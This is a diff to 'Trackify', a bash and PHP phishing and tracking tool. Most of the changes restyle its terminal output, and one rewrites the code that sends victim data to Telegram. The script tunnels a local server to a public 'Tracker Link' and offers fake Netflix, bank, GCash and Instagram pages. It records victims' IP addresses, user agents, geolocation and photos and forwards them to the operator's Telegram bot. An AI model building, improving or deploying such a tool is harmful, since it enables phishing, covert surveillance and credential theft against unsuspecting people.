@@ -1,26 +1,35 @@
 #!/bin/bash
-# Trackify v1.0
+# Trackify v1.0 — Hack-style terminal UI
 
+# ANSI: hack palette — use real ESC so terminals don't show literal \e[...]
+ESC=$'\033'
+C="${ESC}[0;36m"
+G="${ESC}[0;32m"
+Gb="${ESC}[1;32m"
+Y="${ESC}[0;33m"
+R="${ESC}[0;31m"
+Rb="${ESC}[1;31m"
+W="${ESC}[0;37m"
+Dim="${ESC}[0;90m"
+Reset="${ESC}[0m"
 
 trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;92m ████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███████╗██╗   ██╗ \e[0m\n"
-printf "\e[1;92m ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝╚██╗ ██╔╝ \e[0m\n"
-printf "\e[1;92m    ██║   ██████╔╝███████║██║     █████╔╝ ██║█████╗   ╚████╔╝  \e[0m\n"
-printf "\e[1;92m    ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██╔══╝    ╚██╔╝   \e[0m\n"
-printf "\e[1;92m    ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║        ██║    \e[0m\n"
-printf "\e[1;92m    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝    \e[0m\n"
-printf "\n"
-printf "\e[1;91m                 ▄︻̷̿┻̿═━一  TRACKIFY  一━═┻̿︻̷▄                \e[0m\n"
-printf " \e[1;93m Developed by: 0Cod3 \e[0m\n"
-printf "\n"
-
-
-printf "\n"
-
-
+printf "${C}"
+printf "  ╔══════════════════════════════════════════════════════════════╗\n"
+printf "  ║  ${G}████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███████╗██╗   ██╗${C}  ║\n"
+printf "  ║  ${G}╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝╚██╗ ██╔╝${C}  ║\n"
+printf "  ║  ${G}   ██║   ██████╔╝███████║██║     █████╔╝ ██║█████╗   ╚████╔╝ ${C}  ║\n"
+printf "  ║  ${G}   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██╔══╝    ╚██╔╝  ${C}  ║\n"
+printf "  ║  ${G}   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║        ██║   ${C}  ║\n"
+printf "  ║  ${G}   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ${C}  ║\n"
+printf "  ╠══════════════════════════════════════════════════════════════╣\n"
+printf "  ║  ${Y}  [*] IP TRACKER // GEOLOCATION  │  root@trackify:~#${C}           ║\n"
+printf "  ╚══════════════════════════════════════════════════════════════╝\n"
+printf "${Reset}\n"
+printf "  ${Dim}Developed by: 0Cod3${Reset}\n\n"
 }
 
 dependencies() {
@@ -65,7 +74,7 @@ catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "${C}[${G}+${C}] IP:${W} %s${Reset}\n" $ip
 
 cat ip.txt >> saved.ip.txt
 
@@ -75,12 +84,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "${G}[${C}*${G}] Waiting targets,${W} Press Ctrl + C to exit...${Reset}\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n${Gb}[${G}+${Gb}] Target opened the link!${Reset}\n"
 catch_ip
 rm -rf ip.txt
 
@@ -89,7 +98,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Victim's Photo Received!\e[0m\n"
+printf "\n${Gb}[${G}+${Gb}] Victim's Photo Received!${Reset}\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -103,7 +112,7 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+printf "${C}[${Y}+${C}] Starting Serveo...${Reset}\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
@@ -112,13 +121,13 @@ fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
 
 sleep 8
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+printf "${C}[${Y}+${C}] Starting php server... (localhost:3333)${Reset}\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 
 # Wait for sendlink file to have content (with timeout)
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for Serveo link...\e[0m\n"
+printf "${C}[${Y}+${C}] Waiting for Serveo link...${Reset}\n"
 max_wait=30
 wait_count=0
 while [ $wait_count -lt $max_wait ]; do
@@ -147,14 +156,14 @@ if [[ -z "$send_link" ]]; then
 fi
 # Display the link
 if [[ -n "$send_link" ]]; then
-    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
+    printf "\n${G}[${C}+${G}] Tracker Link:${W} %s${Reset}\n\n" "$send_link"
 else
-    printf '\n\e[1;31m[!] Could not extract link from sendlink file\e[0m\n'
-    printf '\e[1;77m[DEBUG] sendlink file exists: %s\e[0m\n' "$([ -e sendlink ] && echo 'yes' || echo 'no')"
-    printf '\e[1;77m[DEBUG] sendlink file size: %s bytes\e[0m\n' "$([ -e sendlink ] && wc -c < sendlink || echo '0')"
-    printf '\e[1;77m[DEBUG] sendlink contents:\e[0m\n'
+    printf "\n${Rb}[!] Could not extract link from sendlink file${Reset}\n"
+    printf "${Dim}[DEBUG] sendlink file exists: %s${Reset}\n" "$([ -e sendlink ] && echo 'yes' || echo 'no')"
+    printf "${Dim}[DEBUG] sendlink file size: %s bytes${Reset}\n" "$([ -e sendlink ] && wc -c < sendlink || echo '0')"
+    printf "${Dim}[DEBUG] sendlink contents:${Reset}\n"
     cat sendlink 2>/dev/null || echo "Cannot read sendlink file"
-    printf '\e[1;77m[DEBUG] Cleaned contents (without ANSI codes):\e[0m\n'
+    printf "${Dim}[DEBUG] Cleaned contents (without ANSI codes):${Reset}\n"
     cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' || echo "Cannot process sendlink file"
     printf '\n'
 fi
@@ -166,7 +175,7 @@ payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 if [[ -z "$link" ]]; then
-    printf "\e[1;31m[!] Error: Could not extract Ngrok link\e[0m\n"
+    printf "${Rb}[!] Error: Could not extract Ngrok link${Reset}\n"
     return 1
 fi
 generate_payload "$link"
@@ -177,7 +186,7 @@ cloudflared_server() {
 
 command -v cloudflared > /dev/null 2>&1
 if [[ $? -ne 0 ]]; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared not found. Downloading...\n"
+    printf "${G}[${G}+${G}] Cloudflared not found. Downloading...${Reset}\n"
     arch=$(uname -m)
     os=$(uname -s | tr '[:upper:]' '[:lower:]')
     
@@ -197,16 +206,16 @@ if [[ $? -ne 0 ]]; then
             wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64 -O cloudflared 2>/dev/null
         fi
     else
-        printf "\e[1;93m[!] Unsupported OS. Please install cloudflared manually.\e[0m\n"
-        printf "\e[1;93m[!] Visit: https://github.com/cloudflare/cloudflared/releases\e[0m\n"
+        printf "${Y}[!] Unsupported OS. Please install cloudflared manually.${Reset}\n"
+        printf "${Y}[!] Visit: https://github.com/cloudflare/cloudflared/releases${Reset}\n"
         exit 1
     fi
     
     if [[ -e cloudflared ]]; then
         chmod +x cloudflared
-        printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflared downloaded successfully\e[0m\n"
+        printf "${G}[${C}*${G}] Cloudflared downloaded successfully${Reset}\n"
     else
-        printf "\e[1;93m[!] Download failed. Please install cloudflared manually.\e[0m\n"
+        printf "${Y}[!] Download failed. Please install cloudflared manually.${Reset}\n"
         exit 1
     fi
 fi
@@ -215,12 +224,12 @@ if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+printf "${C}[${Y}+${C}] Starting php server... (localhost:3333)${Reset}\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 2
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Cloudflare tunnel...\e[0m\n"
+printf "${C}[${Y}+${C}] Starting Cloudflare tunnel...${Reset}\n"
 if [[ -e cloudflared ]]; then
     ./cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
 else
@@ -230,7 +239,7 @@ fi
 sleep 8
 
 # Wait for sendlink file to have content (with timeout)
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for Cloudflare tunnel link...\e[0m\n"
+printf "${C}[${Y}+${C}] Waiting for Cloudflare tunnel link...${Reset}\n"
 max_wait=30
 wait_count=0
 while [ $wait_count -lt $max_wait ]; do
@@ -248,13 +257,13 @@ done
 send_link=$(cat sendlink 2>/dev/null | grep -oE "https://[a-zA-Z0-9\-]+\.trycloudflare\.com" | head -n1)
 
 if [[ -n "$send_link" ]]; then
-    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Tracker Link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
+    printf "\n${G}[${C}+${G}] Tracker Link:${W} %s${Reset}\n\n" "$send_link"
     # Generate payload with the extracted link
     generate_payload "$send_link"
 else
-    printf '\n\e[1;31m[!] Could not extract Cloudflare tunnel link\e[0m\n'
-    printf '\e[1;77m[DEBUG] sendlink file exists: %s\e[0m\n' "$([ -e sendlink ] && echo 'yes' || echo 'no')"
-    printf '\e[1;77m[DEBUG] sendlink contents:\e[0m\n'
+    printf "\n${Rb}[!] Could not extract Cloudflare tunnel link${Reset}\n"
+    printf "${Dim}[DEBUG] sendlink file exists: %s${Reset}\n" "$([ -e sendlink ] && echo 'yes' || echo 'no')"
+    printf "${Dim}[DEBUG] sendlink contents:${Reset}\n"
     cat sendlink 2>/dev/null | head -20 || echo "Cannot read sendlink file"
     printf '\n'
     return 1
@@ -265,7 +274,7 @@ fi
 generate_payload() {
 local link="$1"
 if [[ -z "$link" ]]; then
-    printf '\e[1;31m[!] Error: No link provided for payload generation\e[0m\n'
+    printf "${Rb}[!] Error: No link provided for payload generation${Reset}\n"
     return 1
 fi
 
@@ -356,14 +365,12 @@ if (file_exists($config_file)) {
 
 // Only send if Telegram is configured
 if (!empty($telegram_token) && !empty($telegram_chat)) {
-    // Escape special characters in message
     $browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
     $message = "🔔 *New Target Opened Link*\n\n";
     $message .= "📍 *IP Address:* " . $ip_clean . "\n";
     $message .= "🌐 *User Agent:* " . $browser_clean . "\n";
     $message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";
 
-    // Add geolocation to Telegram message if available
     if ($geo && function_exists('formatGeoForTelegram') && isset($geo['status']) && $geo['status'] === 'success') {
         $message .= "\n" . formatGeoForTelegram($geo);
     }
@@ -375,24 +382,37 @@ if (!empty($telegram_token) && !empty($telegram_chat)) {
         'parse_mode' => 'Markdown'
     );
 
-    $options = array(
-        'http' => array(
-            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method' => 'POST',
-            'content' => http_build_query($data),
-            'timeout' => 10,
-            'ignore_errors' => true
-        )
-    );
-
-    $context = stream_context_create($options);
-    $result = @file_get_contents($url, false, $context);
-
-    // Log errors if any
-    if ($result === false) {
-        $error = error_get_last();
-        if ($error !== null) {
-            error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 12);
+        $result = @curl_exec($ch);
+        $err = curl_error($ch);
+        curl_close($ch);
+        if ($err) {
+            @error_log("Telegram cURL error: " . $err, 3, "telegram_error.log");
+        }
+    } else {
+        $options = array(
+            'http' => array(
+                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+                'method' => 'POST',
+                'content' => http_build_query($data),
+                'timeout' => 12,
+                'ignore_errors' => true
+            )
+        );
+        $context = stream_context_create($options);
+        $result = @file_get_contents($url, false, $context);
+        if ($result === false && function_exists('error_get_last')) {
+            $e = error_get_last();
+            if ($e) {
+                @error_log("Telegram send error: " . $e['message'], 3, "telegram_error.log");
+            }
         }
     }
 }
@@ -621,10 +641,10 @@ EOF
 fi
 
 if [[ -f "$config_file" ]]; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Telegram configuration saved to %s\e[0m\n" "$config_file"
+    printf "${G}[${G}+${G}] Telegram configuration saved to %s${Reset}\n" "$config_file"
     return 0
 else
-    printf "\e[1;93m[!] Warning: Could not save configuration file\e[0m\n"
+    printf "${Y}[!] Warning: Could not save configuration file${Reset}\n"
     return 1
 fi
 }
@@ -644,32 +664,33 @@ fi
 }
 
 test_telegram_bot() {
-local test_message="✅ Trackify Telegram bot is configured correctly!\n\nThis is a test message."
+local test_message="Trackify Telegram bot is configured correctly. This is a test message."
 local url="https://api.telegram.org/bot${telegram_token}/sendMessage"
-local data="chat_id=${telegram_chat}&text=${test_message}&parse_mode=Markdown"
 
 if command -v curl > /dev/null 2>&1; then
-    response=$(curl -s -X POST "$url" -d "$data" 2>&1)
+    response=$(curl -s -S --connect-timeout 10 --max-time 15 -X POST "$url" \
+        --data-urlencode "chat_id=${telegram_chat}" \
+        --data-urlencode "text=${test_message}" 2>&1)
 elif command -v wget > /dev/null 2>&1; then
-    response=$(wget -qO- --post-data="$data" "$url" 2>&1)
+    response=$(wget -qO- --timeout=15 --post-data="chat_id=${telegram_chat}&text=$(printf '%s' "$test_message" | sed 's/ /%20/g')" "$url" 2>&1)
 else
-    printf "\e[1;93m[!] curl or wget not found. Cannot test Telegram connection.\e[0m\n"
-    printf "\e[1;93m[!] Please make sure your bot token and chat ID are correct.\e[0m\n"
+    printf "${Y}[!] curl or wget not found. Cannot test Telegram connection.${Reset}\n"
+    printf "${Y}[!] Please make sure your bot token and chat ID are correct.${Reset}\n"
     return 1
 fi
 
 if echo "$response" | grep -q '"ok":true'; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Telegram bot test successful! Check your Telegram for the test message.\e[0m\n"
+    printf "${G}[${G}+${G}] Telegram bot test successful! Check your Telegram for the test message.${Reset}\n"
     return 0
 else
-    printf "\e[1;91m[!] Telegram bot test failed!\e[0m\n"
-    printf "\e[1;93m[!] Response: %s\e[0m\n" "$response"
-    printf "\e[1;93m[!] Common issues:\e[0m\n"
-    printf "\e[1;93m    - Invalid bot token\e[0m\n"
-    printf "\e[1;93m    - Bot hasn't been started (send /start to your bot first)\e[0m\n"
-    printf "\e[1;93m    - Invalid username/chat ID\e[0m\n"
-    printf "\e[1;93m    - Username must start with @ or be a numeric chat ID\e[0m\n"
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Continue anyway? [y/N]: \e[0m' continue_anyway
+    printf "${Rb}[!] Telegram bot test failed!${Reset}\n"
+    printf "${Y}[!] Response: %s${Reset}\n" "$response"
+    printf "${Y}[!] Common issues:${Reset}\n"
+    printf "${Y}    - Invalid bot token${Reset}\n"
+    printf "${Y}    - Bot hasn't been started (send /start to your bot first)${Reset}\n"
+    printf "${Y}    - Invalid username/chat ID${Reset}\n"
+    printf "${Y}    - Username must start with @ or be a numeric chat ID${Reset}\n"
+    read -p $'\n'"${G}[${C}+${G}] Continue anyway? [y/N]: ${Reset}" continue_anyway
     if [[ ! "$continue_anyway" =~ ^[Yy]$ ]]; then
         select_notification
     fi
@@ -678,41 +699,41 @@ fi
 }
 
 select_notification() {
-printf "\n-----Choose notification method----\n"
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Default (Local file)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Telegram Bot\e[0m\n"
+printf "\n${C}----- Choose notification method -----${Reset}\n"
+printf "\n  ${G}[${W}01${G}]${Y} Default (Local file)${Reset}\n"
+printf "  ${G}[${W}02${G}]${Y} Telegram Bot${Reset}\n"
 default_option_notification="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose notification method: [Default is 1] \e[0m' option_notification
+read -p $'\n'"${G}[${C}+${G}] Choose notification method: [Default is 1] ${Reset}" option_notification
 option_notification="${option_notification:-${default_option_notification}}"
 if [[ $option_notification -eq 1 ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Default (Local file)\e[0m\n"
+printf "${Y}[${C}*${Y}] Selected: Default (Local file)${Reset}\n"
 telegram_enabled="0"
 elif [[ $option_notification -eq 2 ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Telegram Bot\e[0m\n"
+printf "${Y}[${C}*${Y}] Selected: Telegram Bot${Reset}\n"
 telegram_enabled="1"
 
 # Try to load from config file first
 if read_telegram_config; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Loaded Telegram configuration from telegram_config.json\e[0m\n"
-    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Bot Token: %s...\e[0m\n" "${telegram_token:0:20}"
-    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Chat ID: %s\e[0m\n" "$telegram_chat"
-    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Testing Telegram bot connection...\e[0m\n"
+    printf "${G}[${G}+${G}] Loaded Telegram configuration from telegram_config.json${Reset}\n"
+    printf "${C}[${Y}+${C}] Bot Token: ${W}%s...${Reset}\n" "${telegram_token:0:20}"
+    printf "${C}[${Y}+${C}] Chat ID: ${W}%s${Reset}\n" "$telegram_chat"
+    printf "${C}[${Y}+${C}] Testing Telegram bot connection...${Reset}\n"
     test_telegram_bot
 else
     # Config file doesn't exist or is invalid, prompt for details
-    printf "\e[1;93m[\e[0m*\e[1;93m] No valid Telegram configuration found in telegram_config.json\e[0m\n"
-    printf "\e[1;93m[\e[0m*\e[1;93m] Note: Get your bot token from @BotFather on Telegram\e[0m\n"
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Telegram Bot Token: \e[0m' telegram_token
-    printf "\e[1;93m[\e[0m*\e[1;93m] Note: Enter YOUR username (where bot will send data), NOT the bot username\e[0m\n"
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YOUR Telegram Username (e.g., yourusername) or Chat ID: \e[0m' telegram_chat_input
+    printf "${Y}[${C}*${Y}] No valid Telegram configuration found in telegram_config.json${Reset}\n"
+    printf "${Y}[${C}*${Y}] Note: Get your bot token from @BotFather on Telegram${Reset}\n"
+    read -p $'\n'"${G}[${C}+${G}] Enter Telegram Bot Token: ${Reset}" telegram_token
+    printf "${Y}[${C}*${Y}] Note: Enter YOUR username (where bot will send data), NOT the bot username${Reset}\n"
+    read -p $'\n'"${G}[${C}+${G}] Enter YOUR Telegram Username (e.g., yourusername) or Chat ID: ${Reset}" telegram_chat_input
     if [[ -z "$telegram_token" ]] || [[ -z "$telegram_chat_input" ]]; then
-        printf "\e[1;93m [!] Telegram token and username/chat_id are required!\e[0m\n"
+        printf "${Y} [!] Telegram token and username/chat_id are required!${Reset}\n"
         sleep 1
         select_notification
     else
         telegram_chat=$(normalize_telegram_chat "$telegram_chat_input")
-        printf "\e[1;92m[\e[0m*\e[1;92m] Using chat identifier: %s\e[0m\n" "$telegram_chat"
-        printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Testing Telegram bot connection...\e[0m\n"
+        printf "${G}[${C}*${G}] Using chat identifier: ${W}%s${Reset}\n" "$telegram_chat"
+        printf "${C}[${Y}+${C}] Testing Telegram bot connection...${Reset}\n"
         test_telegram_bot
         
         # Save configuration after successful test
@@ -722,26 +743,26 @@ else
     fi
 fi
 else
-printf "\e[1;93m [!] Invalid notification option! try again\e[0m\n"
+printf "${Y} [!] Invalid notification option! try again${Reset}\n"
 sleep 1
 select_notification
 fi
 }
 
 select_template() {
-printf "\n-----Choose a template----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m YouTube Live\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Google Meet\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Sensitive Video (Age Verification)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Netflix Login\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Instagram Verification\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Bank Login\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m GCash Verification\e[0m\n"
+printf "\n${C}----- Choose a template -----${Reset}\n"
+printf "\n  ${G}[${W}01${G}]${Y} YouTube Live${Reset}\n"
+printf "  ${G}[${W}02${G}]${Y} Google Meet${Reset}\n"
+printf "  ${G}[${W}03${G}]${Y} Sensitive Video (Age Verification)${Reset}\n"
+printf "  ${G}[${W}04${G}]${Y} Netflix Login${Reset}\n"
+printf "  ${G}[${W}05${G}]${Y} Instagram Verification${Reset}\n"
+printf "  ${G}[${W}06${G}]${Y} Bank Login${Reset}\n"
+printf "  ${G}[${W}07${G}]${Y} GCash Verification${Reset}\n"
 default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+read -p $'\n'"${G}[${C}+${G}] Choose a template: [Default is 1] ${Reset}" option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+read -p $'\n'"${G}[${C}+${G}] Enter YouTube video watch ID: ${Reset}" yt_video_ID
 elif [[ $option_tem -eq 2 ]]; then
 printf ""
 elif [[ $option_tem -eq 3 ]]; then
@@ -755,28 +776,28 @@ printf ""
 elif [[ $option_tem -eq 7 ]]; then
 printf ""
 else
-printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+printf "${Y} [!] Invalid template option! try again${Reset}\n"
 sleep 1
 select_template
 fi
 }
 
 select_tunnel() {
-printf "\n-----Choose a tunnel service----\n"
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare Tunnel (cloudflared)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\n${C}----- Choose a tunnel service -----${Reset}\n"
+printf "\n  ${G}[${W}01${G}]${Y} Ngrok${Reset}\n"
+printf "  ${G}[${W}02${G}]${Y} Cloudflare Tunnel (cloudflared)${Reset}\n"
+printf "  ${G}[${W}03${G}]${Y} Serveo.net${Reset}\n"
 default_option_tunnel="3"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a tunnel service: [Default is 3] \e[0m' option_tunnel
+read -p $'\n'"${G}[${C}+${G}] Choose a tunnel service: [Default is 3] ${Reset}" option_tunnel
 option_tunnel="${option_tunnel:-${default_option_tunnel}}"
 if [[ $option_tunnel -eq 1 ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Ngrok\e[0m\n"
+printf "${Y}[${C}*${Y}] Selected: Ngrok${Reset}\n"
 elif [[ $option_tunnel -eq 2 ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Cloudflare Tunnel\e[0m\n"
+printf "${Y}[${C}*${Y}] Selected: Cloudflare Tunnel${Reset}\n"
 elif [[ $option_tunnel -eq 3 ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Serveo.net\e[0m\n"
+printf "${Y}[${C}*${Y}] Selected: Serveo.net${Reset}\n"
 else
-printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+printf "${Y} [!] Invalid tunnel option! try again${Reset}\n"
 sleep 1
 select_tunnel
 fi
@@ -790,7 +811,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+printf "${G}[${G}+${G}] Downloading Ngrok...${Reset}\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -801,7 +822,7 @@ unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "${Y}[!] Download error... Termux, run: ${W}pkg install wget${Reset}\n"
 exit 1
 fi
 
@@ -812,22 +833,22 @@ unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
-printf "\e[1;93m[!] Download error... \e[0m\n"
+printf "${Y}[!] Download error.${Reset}\n"
 exit 1
 fi
 fi
 fi
 if [[ -e ~/.ngrok2/ngrok.yml ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
+printf "${Y}[${C}*${Y}] your ngrok "
 cat  ~/.ngrok2/ngrok.yml
-read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+read -p $'\n'"${G}[${G}+${G}] Do you want to change your ngrok authtoken? [Y/n]: ${Reset}" chg_token
 if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+read -p "${G}[${C}+${G}] Enter your valid ngrok authtoken: ${Reset}" ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+printf "${G}[${C}*${G}] ${Y}Authtoken has been changed${Reset}\n"
 fi
 else
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+read -p "${G}[${C}+${G}] Enter your valid ngrok authtoken: ${Reset}" ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
 fi
 
@@ -836,24 +857,24 @@ if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "${G}[${G}+${G}] Starting php server...${Reset}\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+printf "${G}[${G}+${G}] Starting ngrok server...${Reset}\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Tracker link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
